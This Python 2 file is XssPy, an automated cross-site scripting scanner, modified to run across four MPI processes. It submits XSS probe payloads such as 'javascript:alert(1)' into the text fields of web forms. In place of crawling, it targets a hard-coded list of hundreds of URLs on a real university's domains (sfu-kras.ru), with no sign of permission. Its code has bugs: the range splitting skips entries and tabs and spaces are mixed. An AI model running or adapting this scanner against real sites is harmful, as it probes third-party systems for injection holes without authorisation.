import mechanize
import sys
import httplib
import argparse
import logging
import time 
from urlparse import urlparse
from mpi4py import MPI

comm = MPI.COMM_WORLD
rank = comm.Get_rank()

start_time =  time.time()
br = mechanize.Browser()  # initiating the browser
br.addheaders = [
    ('User-agent',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1.11)Gecko/20071127 Firefox/2.0.0.11')
]
br.set_handle_robots(False)
br.set_handle_refresh(False)

payloads = ['<svg "ons>', '" onfocus="alert(1);', 'javascript:alert(1)']
blacklist = ['.png', '.jpg', '.jpeg', '.mp3', '.mp4', '.avi', '.gif', '.svg',
             '.pdf']
xssLinks = []            # TOTAL CROSS SITE SCRIPTING FINDINGS


class color:
    BLUE = '\033[94m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BOLD = '\033[1m'
    END = '\033[0m'

    @staticmethod
    def log(lvl, col, msg):
        logger.log(lvl, col + msg + color.END)


print color.BOLD + color.RED + """
XssPy - Finding XSS made easier
Author: Faizan Ahmad (Fsecurify)
Email: fsecurify@gmail.com
Usage: XssPy.py website.com (Not www.website.com OR http://www.website.com)
Comprehensive Scan: python XssPy.py -u website.com -e
Verbose logging: python XssPy.py -u website.com -v
Cookies: python XssPy.py -u website.complex -c name=val name=val

Description: XssPy is a python tool for finding Cross Site Scripting
vulnerabilities in websites. This tool is the first of its kind.
Instead of just checking one page as most of the tools do, this tool
traverses the website and find all the links and subdomains first.
After that, it starts scanning each and every input on each and every
 page that it found while its traversal. It uses small yet effective
payloads to search for XSS vulnerabilities. XSS in many high
profile websites and educational institutes has been found
by using this very tool.
""" + color.END

logger = logging.getLogger(__name__)
lh = logging.StreamHandler()  # Handler for the logger
logger.addHandler(lh)
formatter = logging.Formatter('[%(asctime)s] %(message)s', datefmt='%H:%M:%S')
lh.setFormatter(formatter)

parser = argparse.ArgumentParser()
parser.add_argument('-u', action='store', dest='url',
                    help='The URL to analyze')
parser.add_argument('-e', action='store_true', dest='compOn',
                    help='Enable comprehensive scan')
parser.add_argument('-v', action='store_true', dest='verbose',
                    help='Enable verbose logging')
parser.add_argument('-c', action='store', dest='cookies',
                    help='Space separated list of cookies',
                    nargs='+', default=[])
results = parser.parse_args()

logger.setLevel(logging.DEBUG if results.verbose else logging.INFO)


def testPayload(payload, p, link):
    br.form[str(p.name)] = payload
    br.submit()
    # if payload is found in response, we have XSS
    if payload in br.response().read():
        color.log(logging.DEBUG, color.BOLD + color.GREEN, 'XSS found!')
        report = 'Link: %s, Payload: %s, Element: %s' % (str(link),
                                                         payload, str(p.name))
        color.log(logging.INFO, color.BOLD + color.GREEN, report)
        xssLinks.append(report)
    br.back()


def initializeAndFind():

    if not results.url:    # if the url has been passed or not
        color.log(logging.INFO, color.GREEN, 'Url not provided correctly')
        return []

    firstDomains = []    # list of domains
    allURLS = []
    allURLS.append(results.url)    # just one url at the moment
    largeNumberOfUrls = []    # in case one wants to do comprehensive search

    # doing a short traversal if no command line argument is being passed
    color.log(logging.INFO, color.GREEN, 'Doing a short traversal.')
    for url in allURLS:
        smallurl = str(url)
    # Test HTTPS/HTTP compatibility. Prefers HTTPS but defaults to
    # HTTP if any errors are encountered
        try:
            test = httplib.HTTPSConnection(smallurl)
            test.request("GET", "/")
            response = test.getresponse()
            if (response.status == 200) | (response.status == 302):
                url = "https://www." + str(url)
            elif response.status == 301:
                loc = response.getheader('Location')
                url = loc.scheme + '://' + loc.netloc
            else:
                url = "http://www." + str(url)
        except:
            url = "http://www." + str(url)
        try:
            br.open(url)
            for cookie in results.cookies:
                color.log(logging.INFO, color.BLUE,
                          'Adding cookie: %s' % cookie)
                br.set_cookie(cookie)
            br.open(url)
            color.log(logging.INFO, color.GREEN,
                      'Finding all the links of the website ' + str(url))
            firstDomains = ["http://www.sfu-kras.ru/", "http://about.sfu-kras.ru/", "http://about.sfu-kras.ru/general", "http://about.sfu-kras.ru/docs", "http://about.sfu-kras.ru/style", "http://about.sfu-kras.ru/rating", "http://about.sfu-kras.ru/5top100", "http://about.sfu-kras.ru/jobs", "http://about.sfu-kras.ru/honours", "http://about.sfu-kras.ru/campus/map", "http://about.sfu-kras.ru/partners", "http://about.sfu-kras.ru/anteroom", "http://about.sfu-kras.ru/contact", "http://structure.sfu-kras.ru/", "http://structure.sfu-kras.ru/departments", "http://structure.sfu-kras.ru/administration", "http://structure.sfu-kras.ru/people", "http://admissions.sfu-kras.ru/", "http://admissions.sfu-kras.ru/", "http://admissions.sfu-kras.ru/exams", "http://admissions.sfu-kras.ru/magisters", "http://admissions.sfu-kras.ru/spo", "http://admissions.sfu-kras.ru/post-graduates", "http://admissions.sfu-kras.ru/doctorates", "http://admissions.sfu-kras.ru/training/courses", "http://admissions.sfu-kras.ru/links", "http://admissions.sfu-kras.ru/contacts", "http://news.sfu-kras.ru/", "http://news.sfu-kras.ru/", "http://news.sfu-kras.ru/popular", "http://news.sfu-kras.ru/events", "http://news.sfu-kras.ru/events/archive", "http://news.sfu-kras.ru/announcements", "http://news.sfu-kras.ru/rubric/52", "http://news.sfu-kras.ru/rubric/24", "http://news.sfu-kras.ru/rubric/23", "http://news.sfu-kras.ru/rubric/25", "http://news.sfu-kras.ru/rubric/26", "http://news.sfu-kras.ru/rubric/41", "http://news.sfu-kras.ru/rubric/44", "http://news.sfu-kras.ru/rubric/66", "http://edu.sfu-kras.ru/", "http://edu.sfu-kras.ru/homepage", "http://edu.sfu-kras.ru/news", "http://edu.sfu-kras.ru/timetable", "http://edu.sfu-kras.ru/graphs", "http://edu.sfu-kras.ru/programs", "http://edu.sfu-kras.ru/engineering", "http://edu.sfu-kras.ru/dpo", "http://edu.sfu-kras.ru/languages", "http://edu.sfu-kras.ru/grants", "http://edu.sfu-kras.ru/docs", "http://edu.sfu-kras.ru/res", "http://edu.sfu-kras.ru/elearning", "http://photo.sfu-kras.ru/", "http://photo.sfu-kras.ru/", "http://photo.sfu-kras.ru/rubric/4", "http://photo.sfu-kras.ru/rubric/2", "http://photo.sfu-kras.ru/rubric/11", "http://photo.sfu-kras.ru/rubric/1", "http://photo.sfu-kras.ru/rubric/45", "http://photo.sfu-kras.ru/rubric/3", "http://photo.sfu-kras.ru/rubric/160", "http://photo.sfu-kras.ru/rubric/270", "http://photo.sfu-kras.ru/rubric/8", "http://photo.sfu-kras.ru/rubric/10", "http://photo.sfu-kras.ru/rubric/220", "http://photo.sfu-kras.ru/rubric/32", "http://photo.sfu-kras.ru/rubric/33", "http://photo.sfu-kras.ru/rubric/84", "http://research.sfu-kras.ru/", "http://research.sfu-kras.ru/homepage", "http://research.sfu-kras.ru/news", "http://research.sfu-kras.ru/aspirantura", "http://research.sfu-kras.ru/doktorantura", "http://research.sfu-kras.ru/attestation", "http://research.sfu-kras.ru/actions/confs", "http://research.sfu-kras.ru/projects", "http://research.sfu-kras.ru/grants", "http://research.sfu-kras.ru/labs", "http://research.sfu-kras.ru/innovation", "http://research.sfu-kras.ru/science/schools", "http://research.sfu-kras.ru/stats", "http://research.sfu-kras.ru/links", "http://journal.sfu-kras.ru/", "http://tube.sfu-kras.ru/", "http://tube.sfu-kras.ru/browse", "http://tube.sfu-kras.ru/video-lectures", "http://tube.sfu-kras.ru/about-university", "http://tube.sfu-kras.ru/tv-sfu", "http://tube.sfu-kras.ru/films", "http://tube.sfu-kras.ru/browse/3", "http://tube.sfu-kras.ru/browse/282", "http://tube.sfu-kras.ru/browse/5", "http://sport.sfu-kras.ru/", "http://sport.sfu-kras.ru/homepage", "http://sport.sfu-kras.ru/news", "http://sport.sfu-kras.ru/sections", "http://sport.sfu-kras.ru/recreation", "http://sport.sfu-kras.ru/stadion", "http://sport.sfu-kras.ru/sport_instituts", "http://sport.sfu-kras.ru/best", "http://sport.sfu-kras.ru/wsoc2017", "http://sport.sfu-kras.ru/universiada2019", "http://sport.sfu-kras.ru/zamnoy_sfu", "http://smi.sfu-kras.ru/", "http://smi.sfu-kras.ru/our-smi", "http://smi.sfu-kras.ru/blogs", "http://smi.sfu-kras.ru/our-smi/nuzh", "http://smi.sfu-kras.ru/our-smi/sibforum", "http://smi.sfu-kras.ru/our-smi/ermak", "http://smi.sfu-kras.ru/our-smi/periodicals", "http://smi.sfu-kras.ru/our-smi/site", "http://smi.sfu-kras.ru/u-tv", "http://smi.sfu-kras.ru/our-smi/tv-sfu", "http://smi.sfu-kras.ru/our-smi/radio", "http://journal.sfu-kras.ru/", "http://my.sfu-kras.ru/", "http://my.sfu-kras.ru/news", "http://my.sfu-kras.ru/artists", "http://my.sfu-kras.ru/events", "http://my.sfu-kras.ru/studotryad", "http://my.sfu-kras.ru/U", "http://my.sfu-kras.ru/molpol", "http://my.sfu-kras.ru/safety", "http://my.sfu-kras.ru/anti-corruption", "http://international.sfu-kras.ru/", "http://international.sfu-kras.ru/", "http://international.sfu-kras.ru/education", "http://international.sfu-kras.ru/russian-language", "http://international.sfu-kras.ru/testing", "http://international.sfu-kras.ru/business-trip", "http://international.sfu-kras.ru/grants", "http://international.sfu-kras.ru/invitation", "http://international.sfu-kras.ru/contracts", "http://international.sfu-kras.ru/partners", "http://international.sfu-kras.ru/documents", "http://www.sfu-kras.ru#", "https://i.sfu-kras.ru/", "https://e.sfu-kras.ru/", "http://bik.sfu-kras.ru/", "https://mail.sfu-kras.ru/", "http://www.sfu-kras.ru#", "http://sfu-kras.ru/10", "http://sport.sfu-kras.ru/universiada2019", "http://about.sfu-kras.ru/jobs#tab2", "http://taiga.sfu-kras.ru/", "http://edu.sfu-kras.ru/timetable", "http://career.sfu-kras.ru/", "http://edu.sfu-kras.ru/grants", "http://structure.sfu-kras.ru/intk#section1", "http://bik.sfu-kras.ru/", "http://edu.sfu-kras.ru/res", "http://research.sfu-kras.ru/grants#students", "http://www.sfu-kras.ru/gateways/students", "http://admissions.sfu-kras.ru/exams", "http://admissions.sfu-kras.ru/priem", "http://admissions.sfu-kras.ru/training/courses", "http://admissions.sfu-kras.ru/magisters", "http://admissions.sfu-kras.ru/", "http://dovuz.sfu-kras.ru/podgotovitelnye-kursy", "http://dovuz.sfu-kras.ru/fiziko-matematicheskoj-shkola-sfu-fmsh", "http://dovuz.sfu-kras.ru/muzej-zanimatelnyh-nauk-sfu", "http://dovuz.sfu-kras.ru/uchastie-v-olimpiadah", "http://dovuz.sfu-kras.ru/", "http://research.sfu-kras.ru/aspirantura/specialities", "http://research.sfu-kras.ru/aspirantura/timetable", "http://research.sfu-kras.ru/attestation", "http://journal.sfu-kras.ru/", "http://research.sfu-kras.ru/grants#post-graduates", "http://research.sfu-kras.ru/doktorantura", "http://research.sfu-kras.ru/aspirantura", "https://mail.sfu-kras.ru/", "http://research.sfu-kras.ru/grants#staff", "http://structure.sfu-kras.ru/", "http://about.sfu-kras.ru/docs", "http://fpkp.sfu-kras.ru/", "http://www.sfu-kras.ru/staff/esn", "http://journal.sfu-kras.ru/", "http://bik.sfu-kras.ru/iz/novosti", "http://about.sfu-kras.ru/jobs", "http://www.sfu-kras.ru/gateways/staff", "http://structure.sfu-kras.ru/press-office", "http://about.sfu-kras.ru/style", "http://photo.sfu-kras.ru/rubric/4", "http://structure.sfu-kras.ru/press-office#newslist", "http://structure.sfu-kras.ru/press-office#section1", "http://www.sfu-kras.ru/gateways/press", "http://zakupki.sfu-kras.ru/", "http://career.sfu-kras.ru/employers", "http://www.sfu-kras.ru/rectors", "http://www.sfu-kras.ru/ecoshtab", "http://services.sfu-kras.ru/", "http://services.sfu-kras.ru/reklama", "http://endowment.sfu-kras.ru/", "http://www.sfu-kras.ru/gateways/partners", "http://bik.sfu-kras.ru/", "http://journal.sfu-kras.ru/", "http://alumni.sfu-kras.ru/", "http://about.sfu-kras.ru/anteroom", "http://about.sfu-kras.ru/style", "http://vt.sfu-kras.ru/", "http://www.sfu-kras.ru/gateways/all", "http://news.sfu-kras.ru/node/18976", "http://news.sfu-kras.ru/node/18984", "http://news.sfu-kras.ru/node/18983", "http://news.sfu-kras.ru/node/18978", "http://news.sfu-kras.ru/node/18975", "http://news.sfu-kras.ru/node/18973", "http://news.sfu-kras.ru/node/18972", "http://news.sfu-kras.ru/node/18969", "http://news.sfu-kras.ru/node/18965", "http://news.sfu-kras.ru/node/18964", "http://news.sfu-kras.ru/node/18959", "http://news.sfu-kras.ru/", "http://pay.sfu-kras.ru/", "http://smi.sfu-kras.ru/blogs", "http://sport.sfu-kras.ru/universiada2019/village", "http://news.sfu-kras.ru/events", "http://www.sfu-kras.ru#", "http://www.sfu-kras.ru#", "http://news.sfu-kras.ru/node/18979", "http://about.sfu-kras.ru/campus/map#k10", "http://news.sfu-kras.ru/node/17281", "http://news.sfu-kras.ru/node/18880", "http://news.sfu-kras.ru/node/18307", "http://news.sfu-kras.ru/node/17822", "http://about.sfu-kras.ru/campus/map#k1", "http://news.sfu-kras.ru/node/18705", "http://news.sfu-kras.ru/node/17258", "http://about.sfu-kras.ru/campus/map#hall", "http://news.sfu-kras.ru/announcements", "http://news.sfu-kras.ru/node/17297", "http://news.sfu-kras.ru/node/18987", "http://news.sfu-kras.ru/node/18981", "http://news.sfu-kras.ru/node/18954", "http://news.sfu-kras.ru/node/18943", "http://news.sfu-kras.ru/node/18971", "http://news.sfu-kras.ru/node/18961", "http://news.sfu-kras.ru/node/18949", "http://news.sfu-kras.ru/node/18948", "http://news.sfu-kras.ru/node/18898", "http://news.sfu-kras.ru/node/18944", "http://news.sfu-kras.ru/node/18925", "http://news.sfu-kras.ru/node/18888", "http://news.sfu-kras.ru/node/16798", "http://news.sfu-kras.ru/node/18870", "http://news.sfu-kras.ru/node/17354", "http://news.sfu-kras.ru/node/18882", "http://news.sfu-kras.ru/node/18832", "http://news.sfu-kras.ru/node/18198", "http://news.sfu-kras.ru/node/18739", "http://news.sfu-kras.ru/node/18734", "http://news.sfu-kras.ru/node/11713", "http://news.sfu-kras.ru/node/18519", "http://news.sfu-kras.ru/node/18473", "http://news.sfu-kras.ru/node/18374", "http://news.sfu-kras.ru/node/18221", "http://news.sfu-kras.ru/node/16508", "http://news.sfu-kras.ru/node/18155", "http://news.sfu-kras.ru/node/17436", "http://news.sfu-kras.ru/node/16311", "http://news.sfu-kras.ru/node/6800", "http://news.sfu-kras.ru/node/15502", "http://www.sfu-kras.ru/updates", "http://about.sfu-kras.ru/node/9867", "http://research.sfu-kras.ru/node/12574", "http://research.sfu-kras.ru/node/12573", "http://research.sfu-kras.ru/node/12572", "http://structure.sfu-kras.ru/node/2320", "http://about.sfu-kras.ru/node/9866", "http://about.sfu-kras.ru/node/9865", "http://about.sfu-kras.ru/node/9863", "http://about.sfu-kras.ru/node/9862", "http://about.sfu-kras.ru/node/9019", "http://about.sfu-kras.ru/node/9704", "http://about.sfu-kras.ru/node/9699", "http://about.sfu-kras.ru/node/9705", "http://about.sfu-kras.ru/node/9312", "http://about.sfu-kras.ru/node/9308", "http://about.sfu-kras.ru/node/9861", "http://about.sfu-kras.ru/node/9860", "http://about.sfu-kras.ru/node/9859", "http://research.sfu-kras.ru/node/12566", "http://about.sfu-kras.ru/node/9858", "http://about.sfu-kras.ru/node/9857", "http://about.sfu-kras.ru/node/9856", "http://about.sfu-kras.ru/node/9855", "http://about.sfu-kras.ru/node/9854", "http://about.sfu-kras.ru/node/9853", "http://about.sfu-kras.ru/node/9852", "http://about.sfu-kras.ru/node/9851", "http://about.sfu-kras.ru/node/9850", "http://about.sfu-kras.ru/node/9849", "http://about.sfu-kras.ru/node/9789", "http://photo.sfu-kras.ru/", "http://photo.sfu-kras.ru/node/2166", "http://photo.sfu-kras.ru/node/2165", "http://photo.sfu-kras.ru/node/2164", "http://photo.sfu-kras.ru/node/2163", "http://photo.sfu-kras.ru/node/2161", "http://photo.sfu-kras.ru/node/2157", "http://photo.sfu-kras.ru/node/2152", "http://photo.sfu-kras.ru/node/2150", "http://photo.sfu-kras.ru/node/2146", "http://photo.sfu-kras.ru/node/2145", "http://tube.sfu-kras.ru/", "http://tube.sfu-kras.ru/video/2269", "http://tube.sfu-kras.ru/video/2268", "http://tube.sfu-kras.ru/video/2267", "http://tube.sfu-kras.ru/video/2265", "http://tube.sfu-kras.ru/video/2264", "http://tube.sfu-kras.ru/video/2263", "http://tube.sfu-kras.ru/video/2261", "http://tube.sfu-kras.ru/video/2260", "http://tube.sfu-kras.ru/video/2259", "http://tube.sfu-kras.ru/video/2257", "http://www.sfu-kras.ru/", "http://about.sfu-kras.ru/", "http://structure.sfu-kras.ru/", "http://admissions.sfu-kras.ru/", "http://news.sfu-kras.ru/", "http://edu.sfu-kras.ru/", "http://photo.sfu-kras.ru/", "http://research.sfu-kras.ru/", "http://tube.sfu-kras.ru/", "http://sport.sfu-kras.ru/", "http://smi.sfu-kras.ru/", "http://my.sfu-kras.ru/", "http://international.sfu-kras.ru/", "http://www.sfu-kras.ru/gateways/students", "http://admissions.sfu-kras.ru/", "http://dovuz.sfu-kras.ru/", "http://research.sfu-kras.ru/aspirantura", "http://www.sfu-kras.ru/gateways/staff", "http://www.sfu-kras.ru/gateways/press", "http://www.sfu-kras.ru/gateways/partners", "http://www.sfu-kras.ru/gateways/all", "http://smi.sfu-kras.ru/our-smi/site", "http://about.sfu-kras.ru/contact", "http://smi.sfu-kras.ru/our-smi/site/feedback?page=http%3A%2F%2Fwww.sfu-kras.ru%2F", "http://www.sfu-kras.ru/sveden", "http://www.sfu-kras.ru#special-version", "http://vii.sfu-kras.ru/", "http://hi.sfu-kras.ru/", "http://isi.sfu-kras.ru/", "http://iad.sfu-kras.ru/", "http://igd.sfu-kras.ru/", "http://efir.sfu-kras.ru/", "http://ikit.sfu-kras.ru/", "http://math.sfu-kras.ru/", "http://inig.sfu-kras.ru/", "http://ipps.sfu-kras.ru/", "http://iubpe.sfu-kras.ru/", "http://ifksit.sfu-kras.ru/", "http://ifiyak.sfu-kras.ru/", "http://bio.sfu-kras.ru/", "http://icmim.sfu-kras.ru/", "http://ieig.sfu-kras.ru/", "http://eco.sfu-kras.ru/", "http://polytech.sfu-kras.ru/", "http://tei.sfu-kras.ru/", "http://law.sfu-kras.ru/", "http://khti.sfu-kras.ru.ru/", "http://www.sfu-kras.ru#", "http://structure.sfu-kras.ru/node/3", "http://structure.sfu-kras.ru/node/72", "http://www.sfu-kras.ru#", "http://structure.sfu-kras.ru/node/679", "http://structure.sfu-kras.ru/node/783", "http://structure.sfu-kras.ru/node/694", "http://structure.sfu-kras.ru/node/667", "http://structure.sfu-kras.ru/node/745", "http://structure.sfu-kras.ru/node/602", "http://structure.sfu-kras.ru/node/626", "http://structure.sfu-kras.ru/node/83", "http://structure.sfu-kras.ru/node/528", "http://structure.sfu-kras.ru/node/621", "http://structure.sfu-kras.ru/node/560", "http://structure.sfu-kras.ru/node/97", "http://structure.sfu-kras.ru/node/685", "http://structure.sfu-kras.ru/node/277", "http://structure.sfu-kras.ru/node/572", "http://structure.sfu-kras.ru/node/564", "http://structure.sfu-kras.ru/node/1476", "http://structure.sfu-kras.ru/node/543", "http://structure.sfu-kras.ru/node/692", "http://structure.sfu-kras.ru/node/2181", "http://structure.sfu-kras.ru/node/603", "http://structure.sfu-kras.ru/node/630", "http://structure.sfu-kras.ru/node/710", "http://structure.sfu-kras.ru/node/653", "http://structure.sfu-kras.ru/node/77", "http://www.sfu-kras.ru#", "http://structure.sfu-kras.ru/node/461", "http://structure.sfu-kras.ru/node/462", "http://structure.sfu-kras.ru/node/744", "http://structure.sfu-kras.ru/node/2011", "http://structure.sfu-kras.ru/node/568", "http://structure.sfu-kras.ru/node/647", "http://structure.sfu-kras.ru/node/1672", "http://structure.sfu-kras.ru/node/646", "http://structure.sfu-kras.ru/node/775", "http://structure.sfu-kras.ru/node/629", "http://structure.sfu-kras.ru/node/1918", "http://structure.sfu-kras.ru/node/1977", "http://structure.sfu-kras.ru/node/782", "http://structure.sfu-kras.ru/node/2320", "http://structure.sfu-kras.ru/node/652", "http://structure.sfu-kras.ru/node/546", "http://structure.sfu-kras.ru/node/743", "http://structure.sfu-kras.ru/node/211", "http://structure.sfu-kras.ru/node/509", "http://structure.sfu-kras.ru/node/693", "http://structure.sfu-kras.ru/node/742", "http://structure.sfu-kras.ru/node/779", "http://www.sfu-kras.ru#", "http://structure.sfu-kras.ru/node/2041", "http://structure.sfu-kras.ru/node/1982", "http://structure.sfu-kras.ru/node/2074", "http://structure.sfu-kras.ru/node/1436", "http://structure.sfu-kras.ru/node/1184", "http://structure.sfu-kras.ru/node/1183", "http://structure.sfu-kras.ru/node/2078", "http://structure.sfu-kras.ru/node/1926", "http://structure.sfu-kras.ru/node/1334", "http://www.sfu-kras.ru#", "http://structure.sfu-kras.ru/node/1401", "http://structure.sfu-kras.ru/node/1590", "http://structure.sfu-kras.ru/node/1527", "http://structure.sfu-kras.ru/node/1465", "http://structure.sfu-kras.ru/node/1457", "http://structure.sfu-kras.ru/node/1327", "http://structure.sfu-kras.ru/node/1335", "http://structure.sfu-kras.ru/node/1458", "http://structure.sfu-kras.ru/node/1189", "http://structure.sfu-kras.ru/node/1186", "http://structure.sfu-kras.ru/node/1445", "http://structure.sfu-kras.ru/node/1182", "http://www.sfu-kras.ru#", "http://www.sfu-kras.ru/", "http://tube.sfu-kras.ru/", "http://international.sfu-kras.ru/", "http://my.sfu-kras.ru/", "http://research.sfu-kras.ru/", "http://news.sfu-kras.ru/", "http://edu.sfu-kras.ru/", "http://search.sfu-kras.ru/", "http://admissions.sfu-kras.ru/", "http://smi.sfu-kras.ru/", "http://sport.sfu-kras.ru/", "http://photo.sfu-kras.ru/", "http://zakupki.sfu-kras.ru/", "https://pay.sfu-kras.ru/", "http://www.sfu-kras.ru#", "http://vii.sfu-kras.ru/", "http://hi.sfu-kras.ru/", "http://isi.sfu-kras.ru/", "http://iad.sfu-kras.ru/", "http://igd.sfu-kras.ru/", "http://efir.sfu-kras.ru/", "http://ikit.sfu-kras.ru/", "http://math.sfu-kras.ru/", "http://inig.sfu-kras.ru/", "http://ipps.sfu-kras.ru/", "http://iubpe.sfu-kras.ru/", "http://ifksit.sfu-kras.ru/", "http://ifiyak.sfu-kras.ru/", "http://bio.sfu-kras.ru/", "http://icmim.sfu-kras.ru/", "http://ieig.sfu-kras.ru/", "http://eco.sfu-kras.ru/", "http://polytech.sfu-kras.ru/", "http://tei.sfu-kras.ru/", "http://law.sfu-kras.ru/", "http://www.sfu-kras.ru#", "http://lpi.sfu-kras.ru/", "http://shf.sfu-kras.ru/", "http://khti.sfu-kras.ru/", "http://www.sfu-kras.ru#", "http://gazeta.sfu-kras.ru/", "http://sibforum.sfu-kras.ru/", "http://journal.sfu-kras.ru/", "http://ecoling.sfu-kras.ru/", "http://www.sfu-kras.ru#", "http://cluster.sfu-kras.ru/", "http://eco.sfu-kras.ru/naturalist", "http://rtc.sfu-kras.ru/", "http://kst.ipps.sfu-kras.ru/", "http://smiuk.sfu-kras.ru/", "http://environment.sfu-kras.ru/", "http://svch.sfu-kras.ru/", "http://www.sfu-kras.ru#", "http://bik.sfu-kras.ru/", "http://publishing.sfu-kras.ru/", "http://knc.sfu-kras.ru/", "http://yenisei.sfu-kras.ru/", "http://nocmu.sfu-kras.ru/", "http://structure.sfu-kras.ru/russian-german-center", "http://rumc.sfu-kras.ru/", "http://dovuz.sfu-kras.ru/", "http://fpkp.sfu-kras.ru/", "http://structure.sfu-kras.ru/geopolitics-center", "http://structure.sfu-kras.ru/grants-center", "http://sp.sfu-kras.ru/", "http://career.sfu-kras.ru/", "http://cie.sfu-kras.ru/", "http://smk.sfu-kras.ru/", "http://ornitology.sfu-kras.ru/", "http://foresight.sfu-kras.ru/", "http://structure.sfu-kras.ru/center-shos", "http://structure.sfu-kras.ru/csk", "http://structure.sfu-kras.ru/japan-center", "http://www.sfu-kras.ru#", "http://alumni.sfu-kras.ru/", "http://zensh.sfu-kras.ru/", "http://noep.sfu-kras.ru/", "http://tourism.sfu-kras.ru/", "http://ciscolab.sfu-kras.ru/", "http://union.sfu-kras.ru/", "http://uppk.ipps.sfu-kras.ru/", "http://endowment.sfu-kras.ru/", "http://school-tp.sfu-kras.ru/", "http://www.sfu-kras.ru#", "http://amoebas.sfu-kras.ru/", "http://elib.sfu-kras.ru/", "http://biolum.sfu-kras.ru/", "http://biotech.sfu-kras.ru/", "http://mgcs.sfu-kras.ru/", "http://arteducation.sfu-kras.ru/", "http://ikit.edu.sfu-kras.ru/", "http://pi.edu.sfu-kras.ru/", "http://tempus-allmeet.ipps.sfu-kras.ru/", "http://sdo.sfu-kras.ru/", "http://e.sfu-kras.ru/", "http://krsu.sfu-kras.ru/", "http://logistika.edu.sfu-kras.ru/", "http://distant.ikit.sfu-kras.ru/", "http://study.sfu-kras.ru/", "http://www.sfu-kras.ru#", "http://yconfs.sfu-kras.ru/", "http://conf.sfu-kras.ru/", "http://fam.conf.sfu-kras.ru/", "http://mlsh-econ.sfu-kras.ru/", "http://ssk.sfu-kras.ru/", "http://rprs.sfu-kras.ru/", "http://infsecurity.sfu-kras.ru/", "http://univerfoto.sfu-kras.ru/", "http://www.sfu-kras.ru#", "https://abiturient.sfu-kras.ru/", "https://mail.sfu-kras.ru/", "http://vt.sfu-kras.ru/", "http://services.sfu-kras.ru/", "http://around.sfu-kras.ru/", "http://webstyle.sfu-kras.ru/", "http://www.sfu-kras.ru#", "http://stolby.sfu-kras.ru/", "http://nature.sfu-kras.ru/", "http://redbook.sfu-kras.ru/", "http://memorial24.sfu-kras.ru/", "http://birds.sfu-kras.ru/", "http://astafiev.sfu-kras.ru/", "http://www.sfu-kras.ru#", "http://www.sfu-kras.ru#", "https://billing.sfu-kras.ru/", "http://users.sfu-kras.ru/", "http://i.sfu-kras.ru/", "http://news.sfu-kras.ru/rss", "http://www.sfu-kras.ru/cn", "http://www.sfu-kras.ru/es", "http://www.sfu-kras.ru/de", "http://www.sfu-kras.ru/en", "http://www.sfu-kras.ru/", "http://www.sfu-kras.ru#header", "http://www.sfu-kras.ru#home-news", "http://www.sfu-kras.ru#home-announcements", "http://www.sfu-kras.ru#home-ads", "http://www.sfu-kras.ru#footer", "http://www.sfu-kras.ru#"]
        except:
            pass
        color.log(logging.INFO, color.GREEN,
                  'Number of links to test are: ' + str(len(firstDomains)))
	Domain = firstDomains
	firstDomains=[]
	if (rank == 0):
	    for i in range (0, len(Domain)/4):
		firstDomains.append(Domain[i])
	if (rank == 1):
	    for i in range (len(Domain)/4+1,len(Domain)/2):
		firstDomains.append(Domain[i])
	if (rank == 2):
	    for i in range (len(Domain)/2+1, 3*len(Domain)/4):
		firstDomains.append(Domain[i])
	if (rank == 3):
	    for i in range (3*len(Domain)/4+1,len(Domain)):
		firstDomains.append(Domain[i])
        if results.compOn:
            color.log(logging.INFO, color.GREEN,
                      'Doing a comprehensive traversal. This may take a while')
            for link in firstDomains:
                try:
                    br.open(link)
                    # going deeper into each link and finding its links
                    for newlink in br.links():
                        if smallurl in str(newlink.absolute_url):
                            largeNumberOfUrls.append(newlink.absolute_url)
                except:
                    pass
            firstDomains = list(set(firstDomains + largeNumberOfUrls))
            color.log(logging.INFO, color.GREEN,
                      'Total Number of links to test have become: ' +
                      str(len(firstDomains)))  # all links have been found
    return firstDomains


def findxss(firstDomains):
    # starting finding XSS
    color.log(logging.INFO, color.GREEN, 'Started finding XSS')
    if firstDomains:    # if there is atleast one link
        for link in firstDomains:
            blacklisted = False
            y = str(link)
            color.log(logging.DEBUG, color.YELLOW, str(link))
            for ext in blacklist:
                if ext in y:
                    color.log(logging.DEBUG, color.RED,
                              '\tNot a good url to test')
                    blacklisted = True
                    break
            if not blacklisted:
                try:
                    br.open(str(link))    # open the link
                    if br.forms():        # if a form exists, submit it
                        params = list(br.forms())[0]    # our form
                        br.select_form(nr=0)    # submit the first form
                        for p in params.controls:
                            par = str(p)
                            # submit only those forms which require text
                            if 'TextControl' in par:
                                color.log(logging.DEBUG, color.YELLOW,
                                          '\tParam: ' + str(p.name))
                                for item in payloads:
                                    testPayload(item, p, link)
                except:
                    pass
        color.log(logging.DEBUG, color.GREEN + color.BOLD,
                  'The following links are vulnerable: ')
        for link in xssLinks:        # print all xss findings
            color.log(logging.DEBUG, color.GREEN, '\t' + link)
    else:
        color.log(logging.INFO, color.RED + color.BOLD,
                  '\tNo link found, exiting')


# calling the function
firstDomains = initializeAndFind()
findxss(firstDomains)
print "{:.4f} sec".format(time.time() - start_time)
